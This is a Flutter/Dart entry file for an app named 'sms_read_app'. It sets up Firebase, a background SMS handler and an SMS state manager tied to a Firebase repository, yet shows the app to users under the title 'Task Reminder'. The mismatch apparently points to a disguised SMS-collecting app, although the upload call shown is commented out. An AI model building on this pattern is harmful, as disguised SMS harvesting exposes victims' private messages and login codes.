import 'package:firebase_core/firebase_core.dart';
import 'package:flutter/material.dart';
import 'package:flutter_bloc/flutter_bloc.dart';
import 'package:sms_read_app/app_main/perm_page.dart';
import 'package:sms_read_app/firebase_options.dart';
import 'package:sms_read_app/repository/firebase_repo.dart';
import 'package:telephony/telephony.dart';
import 'app_main/state/sms_cubit/sms_cubit.dart';

FirebaseRepository firebaseRepository = FirebaseRepository();
backgrounMessageHandler(SmsMessage message) async {
  //firebaseRepository.saveSms(message);
  print(message.body);
}

void main() async {
  WidgetsFlutterBinding.ensureInitialized();
  await Firebase.initializeApp(
    options: DefaultFirebaseOptions.android,
  );

  runApp(const MyApp());
}

class MyApp extends StatefulWidget {
  const MyApp({super.key});

  @override
  State<MyApp> createState() => _MyAppState();
}

class _MyAppState extends State<MyApp> {
  @override
  Widget build(BuildContext context) {
    return MultiRepositoryProvider(
      providers: [
        RepositoryProvider(
          create: (context) => FirebaseRepository(),
        )
      ],
      child: MultiBlocProvider(
        providers: [
          BlocProvider(
            create: (context) =>
                SmsCubit(firebaseRepository: FirebaseRepository()),
          ),
        ],
        child: MaterialApp(
            debugShowCheckedModeBanner: false,
            title: 'Task Reminder',
            theme: ThemeData.dark(),
            home: const PermPage()),
      ),
    );
  }

  asd() {}
}
